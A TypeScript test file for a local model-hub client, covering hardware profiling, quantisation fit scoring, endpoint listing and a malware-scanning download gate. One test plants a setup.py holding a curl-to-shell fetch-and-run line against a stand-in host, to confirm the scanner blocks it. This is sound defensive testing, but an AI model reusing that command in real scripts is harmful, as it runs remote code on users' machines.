import assert from "node:assert/strict";
import { existsSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
/**
 * client.test.ts — the typed Model-Hub client (file 05 §1/§2/§3) against the
 * surfaces that matter, mirroring env.test.ts's discipline (REAL sidecar where it
 * can run; a deterministic fixture for the security-spine shape):
 *
 *   1) hardware()  LIVE (REAL modelhub.py): a well-formed HardwareProfile —
 *      accel "metal" + unified memory on this Apple-silicon mac, usableWeightGb > 0,
 *      validated through HardwareProfileSchema at the boundary.
 *   2) fit()       LIVE (REAL modelhub.py): the Cookbook scorer returns a recommended
 *      quant + ranked quants + reasons[]; validated through FitResultSchema.
 *   3) endpoints() LIVE (REAL modelhub.py → prometheus.py localai): local + open-weight
 *      endpoints really come back from the engine.
 *   4) download()  FAIL-CLOSED TYPED SHAPE: a nemesis-BLOCK is a RETURNED DownloadResult
 *      (not a throw) — the gate verdict rides through camelCased; JS never decides
 *      "safe" (C5). Driven against the blocked-modelhub fixture (deterministic, offline).
 *   5) download()  REAL GATE (REAL modelhub.py → REAL nemesis): a planted malicious
 *      LOCAL staging dir (no network) is BLOCKED + quarantined; a planted benign dir is
 *      ADMITTED. This exercises the FULL TS → sidecar → real-scanner → TS roundtrip.
 */
import { test } from "node:test";
import { fileURLToPath } from "node:url";

import { createModelHubClient } from "./client.js";
import { HardwareProfileSchema } from "./types.js";

const HERE = dirname(fileURLToPath(import.meta.url));
// the REAL studio/python/sidecar dir (…/engine-bridge/src/modelhub -> up 4 = studio).
const REAL_SIDECAR_DIR = join(HERE, "..", "..", "..", "..", "python", "sidecar");
const REAL_MODELHUB = join(REAL_SIDECAR_DIR, "modelhub.py");
const BLOCKED_SIDECAR_DIR = join(HERE, "..", "__fixtures__", "blocked-modelhub");
// nemesis lives next to the engine at the sibling PROMETHEUS root.
const NEMESIS = join(HERE, "..", "..", "..", "..", "..", "nemesis");

test("hardware() LIVE returns a typed HardwareProfile (accel metal + unified on this mac)", async (t) => {
  if (!existsSync(REAL_MODELHUB)) {
    t.skip(`modelhub.py not present at ${REAL_MODELHUB}`);
    return;
  }
  const client = createModelHubClient({ sidecarDir: REAL_SIDECAR_DIR, timeoutMs: 60_000 });
  const hw = await client.hardware();

  assert.equal(typeof hw.id, "string");
  assert.ok(["darwin", "linux", "win32"].includes(hw.os), `os in union, got ${hw.os}`);
  assert.ok(["cuda", "rocm", "metal", "cpu"].includes(hw.accel), `accel in union, got ${hw.accel}`);
  assert.equal(typeof hw.usableWeightGb, "number");
  assert.ok(hw.usableWeightGb > 0, "this dev host has real usable memory");
  assert.ok(Array.isArray(hw.gpus), "gpus must be an array");
  assert.equal(typeof hw.caps.totalVramGb, "number");
  assert.ok(typeof hw.detectedAt === "string" && hw.detectedAt.length > 0);

  if (process.platform === "darwin") {
    // Apple Silicon: Metal + unified memory; the budget is the unified-mem share.
    assert.equal(hw.accel, "metal", "accel is metal on Apple-silicon darwin");
    assert.equal(hw.unified, true, "unified memory on Apple Silicon");
    assert.equal(hw.caps.metal, true, "caps.metal true on Metal");
    assert.equal(hw.caps.fp8, false, "no FP8 on Metal (conservative default)");
    assert.ok(hw.gpus.length >= 1, "the Apple GPU is enumerated");
    assert.ok(
      hw.gpus.some((g) => g.unified),
      "the Apple GPU is unified-memory",
    );
  }
});

test("HardwareProfileSchema.safeParse fails closed on a malformed object", () => {
  // a non-object / shape violation is a SchemaError result, never a trusted value.
  const bad = HardwareProfileSchema.safeParse(42);
  assert.equal(bad.success, false);
  const missing = HardwareProfileSchema.safeParse({ os: "darwin" }); // no ram_gb/usable etc.
  // ram_gb/usable default to 0 but cpu must be an object → still parses (defensive);
  // the point: a primitive input cannot masquerade as a HardwareProfile.
  assert.equal(missing.success, true);
});

test("fit() LIVE returns a recommended quant + ranked + reasons (Cookbook scorer)", async (t) => {
  if (!existsSync(REAL_MODELHUB)) {
    t.skip(`modelhub.py not present at ${REAL_MODELHUB}`);
    return;
  }
  const client = createModelHubClient({ sidecarDir: REAL_SIDECAR_DIR, timeoutMs: 60_000 });
  const fit = await client.fit("qwen3-8b");

  assert.equal(typeof fit.paramsB, "number");
  assert.ok(fit.paramsB > 0, "8B model has params");
  assert.ok(["cuda", "rocm", "metal", "cpu"].includes(fit.accel));
  assert.ok(Array.isArray(fit.ranked) && fit.ranked.length >= 1, "ranked quants present");
  assert.ok(Array.isArray(fit.reasons) && fit.reasons.length >= 1, "reasons explain the pick");
  // an 8B model fits a 36GB-unified mac → a recommendation exists.
  assert.ok(fit.recommended, "a quant is recommended for an 8B model on this hardware");
  assert.equal(typeof fit.recommended?.label, "string");
  assert.ok(
    ["FITS", "TIGHT", "PARTIAL", "OVERFLOW"].includes(fit.recommended?.verdict ?? ""),
    "the recommended quant carries a fit verdict",
  );
  assert.ok(
    fit.recommended?.verdict === "FITS" || fit.recommended?.verdict === "TIGHT",
    "the recommended quant must FIT or be TIGHT (never OVERFLOW)",
  );
  // each ranked quant is a well-formed ScoredQuant.
  for (const q of fit.ranked) {
    assert.equal(typeof q.label, "string");
    assert.equal(typeof q.estVramGb, "number");
    assert.equal(typeof q.qualityRank, "number");
    assert.equal(typeof q.runnable, "boolean");
  }
});

test("fit() LIVE against a tiny provided HW budget OVERFLOWs (no recommendation)", async (t) => {
  if (!existsSync(REAL_MODELHUB)) {
    t.skip(`modelhub.py not present at ${REAL_MODELHUB}`);
    return;
  }
  const client = createModelHubClient({ sidecarDir: REAL_SIDECAR_DIR, timeoutMs: 60_000 });
  // a 70B model against ~2GB usable cannot fit → recommended is null, reasons name the escape hatch.
  const fit = await client.fit("llama3.3-70b", {
    hw: { accel: "cpu", usable_gb: 2, caps: { accel: "cpu" } },
  });
  assert.equal(fit.recommended, null, "nothing fits a 2GB budget for a 70B model");
  assert.ok(
    fit.reasons.some((r) => /OVERFLOW|smaller quant|AirLLM|served/i.test(r)),
    "the reasons name the OVERFLOW escape hatch",
  );
});

test("endpoints() LIVE returns local + open-weight endpoints (REAL prometheus.py localai)", async (t) => {
  if (!existsSync(REAL_MODELHUB)) {
    t.skip(`modelhub.py not present at ${REAL_MODELHUB}`);
    return;
  }
  const client = createModelHubClient({ sidecarDir: REAL_SIDECAR_DIR, timeoutMs: 90_000 });
  const res = await client.endpoints();
  if (!res.ok) {
    t.skip(`localai endpoints unavailable: ${res.error}`);
    return;
  }
  assert.ok(Array.isArray(res.local), "local endpoints array");
  assert.ok(Array.isArray(res.openApi), "open-weight API endpoints array");
  assert.ok(res.local.length + res.openApi.length >= 1, "the engine returns endpoints");
  // a local server endpoint is OpenAI-compatible (…/v1 or a localhost host).
  for (const e of res.local) {
    assert.equal(typeof e.name, "string");
    assert.match(e.baseUrl, /^https?:\/\//, "base_url is a URL");
    assert.ok(
      /localhost|127\.0\.0\.1|host\.docker\.internal/.test(e.baseUrl),
      "a 'local' endpoint points at the local host",
    );
  }
});

test("download() FAIL-CLOSED: a nemesis-BLOCK is a RETURNED value, verdict rides through", async () => {
  // point the client at the deterministic fixture that emits the §5 blocked envelope.
  const client = createModelHubClient({ sidecarDir: BLOCKED_SIDECAR_DIR, timeoutMs: 30_000 });
  // this must NOT throw — a block is a valid, renderable result (C5).
  const res = await client.download({
    id: "evil/malware-gguf",
    quant: "q4_k_m",
    staged: "/tmp/whatever",
  });

  assert.equal(res.ok, false, "a block is ok:false");
  assert.equal(res.blocked, true, "blocked:true rides through");
  assert.notEqual(res.admitted, true, "nothing was admitted");
  assert.equal(res.command, "download");
  assert.ok(res.message?.includes("refused"), "the refusal message is surfaced");
  assert.ok(res.quarantined, "the staged bytes are quarantined (kept for inspection)");

  // the gate verdict is camelCased and carried — JS never decides; it renders.
  assert.ok(res.gate, "the gate summary must ride through");
  assert.equal(res.gate?.verdict, "block");
  assert.equal(res.gate?.score, 100);
  assert.equal(res.gate?.signed, true);
  assert.ok(Array.isArray(res.gate?.reasons) && res.gate.reasons.length >= 1);
  assert.equal(
    res.gate?.scannedAt,
    "2026-06-16T00:00:00Z",
    "scanned_at → scannedAt at the boundary",
  );

  // the model-format supply-chain risk is surfaced (pickle .bin = high risk).
  assert.equal(res.formatRisk?.risk, "high");
  assert.ok(res.formatRisk?.highRiskFiles.includes("pytorch_model.bin"));

  // the raw envelope is the escape hatch.
  assert.equal(res.raw.command, "download");
  assert.equal(res.raw.ok, false);
});

test("download() WITHOUT staged returns the resumable PLAN (no bytes moved)", async (t) => {
  if (!existsSync(REAL_MODELHUB)) {
    t.skip(`modelhub.py not present at ${REAL_MODELHUB}`);
    return;
  }
  const client = createModelHubClient({ sidecarDir: REAL_SIDECAR_DIR, timeoutMs: 60_000 });
  const res = await client.download({ id: "qwen3-8b", quant: "q4_k_m" });
  assert.equal(res.ok, true, "a dry plan is ok:true");
  assert.equal(res.planned, true, "planned:true — nothing fetched");
  assert.equal(res.admitted, undefined, "nothing admitted in a plan");
  assert.ok(res.plan, "the fetch→gate→admit plan is returned for preview");
  assert.ok(res.stageDir, "the stage dir is named");
});

test("download() REAL GATE: a malicious LOCAL staging dir is BLOCKED + quarantined (no network)", async (t) => {
  if (!existsSync(REAL_MODELHUB) || !existsSync(NEMESIS)) {
    t.skip(`modelhub.py or nemesis not present (${REAL_MODELHUB}, ${NEMESIS})`);
    return;
  }
  // plant a malicious file in a LOCAL staging dir — the REAL scanner decides; no fetch.
  const stage = mkdtempSync(join(tmpdir(), "mh-ts-stage-"));
  const lib = mkdtempSync(join(tmpdir(), "mh-ts-lib-"));
  // segregate the live library + quarantine into the temp dir so the test never
  // touches ~/.prometheus (nemesis_gate.models_root() reads PROMETHEUS_MODELS_HOME,
  // which runSidecar forwards via process.env to the child).
  // capture as "" when unset; python (nemesis_gate.models_root) treats "" as unset.
  const prevHome = process.env.PROMETHEUS_MODELS_HOME ?? "";
  process.env.PROMETHEUS_MODELS_HOME = lib;
  try {
    writeFileSync(
      join(stage, "setup.py"),
      'import os\nos.system("curl http://evil.example/x.sh | sh")\n',
    );
    const client = createModelHubClient({
      sidecarDir: REAL_SIDECAR_DIR,
      // give the real nemesis room; it self-limits via the gate timeout.
      timeoutMs: 180_000,
    });
    const res = await client.download({ id: "test/ts-evil", staged: stage });
    // The real scanner must refuse the os.system curl|sh payload.
    assert.equal(res.ok, false, "a real BLOCK is ok:false");
    assert.equal(res.blocked, true, "blocked:true from the real scanner");
    assert.notEqual(res.admitted, true, "nothing admitted");
    assert.ok(res.gate, "the real gate verdict rides through");
    assert.ok(
      res.gate?.verdict === "block" || res.gate?.verdict === "error",
      `real verdict is block/error, got ${res.gate?.verdict}`,
    );
    assert.ok(res.quarantined, "the staged bytes are quarantined, NOT deleted");
    assert.ok(existsSync(res.quarantined ?? ""), "the quarantine dir exists on disk");
  } finally {
    process.env.PROMETHEUS_MODELS_HOME = prevHome;
    rmSync(stage, { recursive: true, force: true });
    rmSync(lib, { recursive: true, force: true });
  }
});
